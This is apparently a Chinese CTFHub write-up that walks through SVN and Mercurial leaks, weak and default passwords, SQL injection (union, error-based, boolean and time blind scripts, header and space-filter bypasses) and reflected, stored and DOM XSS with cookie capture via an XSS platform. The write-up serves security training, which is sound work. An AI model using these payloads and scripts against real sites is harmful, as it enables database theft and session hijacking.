<p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>
<p>如果访问url/.svn/entries有反应的话，就存在svn泄露。直接上工具利用：<a target="_blank" rel="noopener" href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a> --最好在kali安装</p>
<p>安装教程参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/ljj20020718/article/details/127910891?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170290239416800226572715%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=170290239416800226572715&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-127910891-null-null.142%5Ev96%5Epc_search_result_base4&amp;utm_term=svn%E6%B3%84%E9%9C%B2%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85&amp;spm=1018.2226.3001.4187">ctfhub–svn泄露</a></p>
<p>安装好输入以下命令</p>
<pre><code class="hljs plaintext">./rip-svn.pl -v -u url</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218203818976.png" alt="image-20231218203818976"></p>
<p>这里必须要<code>ls -al</code>才能看到恢复的.svn文件，之后tree .svn查看文件目录结构</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218203917706.png" alt="image-20231218203917706"></p>
<p>flag在此目录下，读取即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218203932889.png" alt="image-20231218203932889"></p>
<h3 id="hg泄露">HG泄露</h3>
<p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>
<p>工具依旧是上述的</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218204540647.png" alt="image-20231218204540647"></p>
<p>这里测试了半天，以为能在此直接读到flag的，结果看了wp发现直接访问就行。。。实在是没想到</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218204620280.png" alt="image-20231218204620280"></p>
<p>或者如果这里删掉了该文件，我们可以尝试读取历史文件：路径是 <code>.hg/store/data/flag__2096222060.txt.i </code>注意下划线是两个</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218204733153.png" alt="image-20231218204733153"></p>
<p>当然也可以直接curl访问</p>
<h2 id="密码口令">密码口令</h2>
<h3 id="弱口令">弱口令</h3>
<p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218204923615.png" alt="image-20231218204923615"></p>
<p>这里尝试了几下，admin+123456即可</p>
<h3 id="默认口令">默认口令</h3>
<p>题目说了是默认口令，我们可以谷歌关键词搜索一手</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218210138379.png" alt="image-20231218210138379"></p>
<p>这里也是顺利的在wooyun看了到公开的漏洞，我们尝试一下上述三个账号，第二个是成功的，如下图</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218210103912.png" alt="image-20231218210103912"></p>
<h2 id="sql注入">SQL注入</h2>
<h3 id="整数型注入">整数型注入</h3>
<p>判断是否存在注入点：</p>
<pre><code class="hljs http">?id=1 and 1=1
?id=1 and 1=2</code></pre>
<p>可以发现页面回显不一样。说明是数字型，直接开始注入即可。这里判断字段数是2</p>
<pre><code class="hljs http">爆库：?id=-1 union select 1,database()</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219174121497.png" alt="image-20231219174121497"></p>
<pre><code class="hljs http">爆表名：?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219174102330.png" alt="image-20231219174102330"></p>
<pre><code class="hljs http">爆列名：?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag'</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219174219464.png" alt="image-20231219174219464"></p>
<pre><code class="hljs http">爆数据：?id=-1 union select 1,flag from flag</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219174300468.png" alt="image-20231219174300468"></p>
<p>当然sqlmap就更简单了</p>
<h3 id="字符型注入">字符型注入</h3>
<p>很简单，只不过需要引号闭合一下，后面用–+注释掉即可，不赘述了</p>
<pre><code class="hljs http">?id=-1' union select 1,flag from flag--+</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219174446930.png" alt="image-20231219174446930"></p>
<h3 id="报错注入">报错注入</h3>
<p>简单的报错注入，不需要闭合，直接上payload即可</p>
<pre><code class="hljs http">?id=1 and updatexml(1,concat(0x7e,database()),1)</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219174838992.png" alt="image-20231219174838992"></p>
<pre><code class="hljs http">得到flag：?id=1 and updatexml(1,concat(0x7e,select flag from flag),1)</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219174946298.png" alt="image-20231219174946298"></p>
<p>不过报错显示的字符有限，我们爆出后半部分即可</p>
<pre><code class="hljs http">?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),15,40)),1)</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219175106573.png" alt="image-20231219175106573"></p>
<p>完整：<code>ctfhub{51f61213dc2a24ab5fc09fc7}</code></p>
<h3 id="布尔盲注">布尔盲注</h3>
<pre><code class="hljs http">?id=1 and 1=1
?id=1 and 1=2</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219175252521.png" alt="image-20231219175252521"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219175231504.png" alt="image-20231219175231504"></p>
<p>如上，页面只有两种回显，只能盲注，写脚本，二分法更快。或者sqlmap</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">'http://challenge-f1141910229dba2a.sandbox.ctfhub.com:10800/?id='</span>

flag = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (left + right) // <span class="hljs-number">2</span>
    <span class="hljs-keyword">while</span> left &lt; right:
        payload = url + <span class="hljs-string">f"1 and if(ascii(substr((select flag from flag),<span class="hljs-subst">{i}</span>,1))&gt;<span class="hljs-subst">{mid}</span>,sleep(2),0)#"</span>
        start_time = time.time()
        response = requests.get(payload).text
        end_time = time.time()
        use_time = end_time - start_time

        <span class="hljs-keyword">if</span> use_time &gt; <span class="hljs-number">2</span>:
            left = mid + <span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid = (left + right) // <span class="hljs-number">2</span>

    <span class="hljs-built_in">print</span>(mid)
    flag += <span class="hljs-built_in">chr</span>(mid)
    <span class="hljs-built_in">print</span>(flag)</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219180027132.png" alt="image-20231219180027132"></p>
<h3 id="时间盲注">时间盲注</h3>
<pre><code class="hljs http">?id=1 and sleep(1)
?id=1 and sleep(5)</code></pre>
<p>简单测试一下发现页面回显有所延迟，确定为时间盲注。上脚本或者，sqlmap</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">'http://challenge-3252dd76021b94e3.sandbox.ctfhub.com:10800/?id='</span>
flag = <span class="hljs-string">""</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (left + right) // <span class="hljs-number">2</span>
    <span class="hljs-keyword">while</span> left &lt; right:
        payload = url + <span class="hljs-string">f"1 and if(ascii(substr((select flag from flag),<span class="hljs-subst">{i}</span>,1))&gt;<span class="hljs-subst">{mid}</span>,sleep(2),0)#"</span>
        start_time = time.time()
        response = requests.get(payload).text
        end_time = time.time()
        use_time = end_time - start_time

        <span class="hljs-keyword">if</span> use_time &gt; <span class="hljs-number">2</span>:
            left = mid + <span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid = (left + right) // <span class="hljs-number">2</span>

    <span class="hljs-comment">#print(mid)</span>
    flag += <span class="hljs-built_in">chr</span>(mid)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"flag:"</span>, flag)</code></pre>
<h3 id="mysql结构">MySQL结构</h3>
<p>这道题也不知道什么含义，考点和整数型注入似乎是一样的，只不过换了些名字，过程不赘述了，直接给结果</p>
<pre><code class="hljs plaintext">?id=-1 union select 1,oifqtgzzzi from cjpyvsldua</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219181316085.png" alt="image-20231219181316085"></p>
<h3 id="cookie注入">Cookie注入</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219191336883.png" alt="image-20231219191336883"></p>
<p>提示我们在cookie处</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219191415075.png" alt="image-20231219191415075"></p>
<p>如上图，成功爆库，接下来爆表</p>
<pre><code class="hljs http">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219191527988.png" alt="image-20231219191527988"></p>
<p>爆列名</p>
<pre><code class="hljs http">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='asdlhojeyd'</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219191623662.png" alt="image-20231219191623662"></p>
<p>爆数据</p>
<pre><code class="hljs http">id=-1 union select 1,tbslnjukkx from asdlhojeyd</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219191716003.png" alt="image-20231219191716003"></p>
<h3 id="ua注入">UA注入</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219192046271.png" alt="image-20231219192046271"></p>
<p>看数据就知道注入点在UA头处，直接修改即可，步骤同上，不再赘述</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219192208158.png" alt="image-20231219192208158"></p>
<h3 id="referer注入">Referer注入</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219193020704.png" alt="image-20231219193020704"></p>
<p>直接在referer头处输入SQL语句即可，不再赘述</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219193137036.png" alt="image-20231219193137036"></p>
<h3 id="过滤空格">过滤空格</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219195035851.png" alt="image-20231219195035851"></p>
<p>题目说了过滤空格，直接采用%0a或者内联注释符绕过即可</p>
<pre><code class="hljs http">?id=-1/**/union/**/select/**/1,zfbvfsfjmz/**/from/**/lyvloeyoue</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231219195214490.png" alt="image-20231219195214490"></p>
<h2 id="xss">XSS</h2>
<h3 id="xss-反射型">XSS-反射型</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231221155028167.png" alt="image-20231221155028167"></p>
<p>题目说是反射型，我们先简单测试一下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231221155111294.png" alt="image-20231221155111294"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231221155107898.png" alt="image-20231221155107898"></p>
<p>的确存在，而且没有过滤，那我们分析一下下面的Bot的含义，我们都知道如果网站存在xss的话，其危害通常来说就是获取其他用户甚至是管理员的cookie，密码等等信息，那我们输入恶意xss代码，肯定需要有人去访问或者点击，这样的话我们才能获得他们cookie等信息，而下面的Bot就是存在一个机器人去模仿别的用户或者管理员去点击我们的恶意xss代码，从而我们可以得到其cookie。</p>
<p>那接下来就需要我们的xssplatform了，毕竟bot点击之后只会显示success，其cookie我们无法得知，需要通过xss平台来获取cookie。建议是自己用vps搭一个平台，这里我已经搭建好，随后建一个项目，配置默认即可。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231221155625464.png" alt="image-20231221155625464"></p>
<p>随便复制一个，先提交至上面的输入框</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231221155656804.png" alt="image-20231221155656804"></p>
<p>接下来将得到的url传到下面的bot让其自动点击</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231221155727242.png" alt="image-20231221155727242"></p>
<p>页面显示success之后我们到xss后台就可以看到cookie信息了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231221155812545.png" alt="image-20231221155812545"></p>
<h3 id="xss-存储型">XSS-存储型</h3>
<p>这里同样将上述的xss代码传入上面的输入框，传入之后这个恶意代码就被存入了对方的（受害者）服务器中，随后将靶场地址输入到下面的bot中，其后每当bot访问该网址，就相当于执行一次我们恶意代码，我们只需要在xss平台就可以获得cookie</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231221160549747.png" alt="image-20231221160549747"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231221160515089.png" alt="image-20231221160515089"></p>
<h3 id="xss-dom反射">XSS-DOM反射</h3>
<p>DOM反射说白了，就是审计前端的js代码，这种xss是反射型的变种，他不需要去服务器端进行交互，直接就在前端将插入的js代码渲染了，也就是这完全是客户端的事情。</p>
<p>所以遇到这种反射，我们通常需要考虑如何闭合其代码，从而将我们的恶意js代码得到执行</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231221161953167.png" alt="image-20231221161953167"></p>
<p>这里我们简单测试发现我们输入的内容插入到了这个innerHTML中，但由于其被当成了字符串，所以这个恶意js代码无法执行，因此我们需要考虑闭合。倘若我们构造下列payload：</p>
<pre><code class="hljs js"><span class="hljs-string">';&lt;/script&gt;&lt;script&gt;alert('</span>hacker<span class="hljs-string">')&lt;/script&gt;//</span>
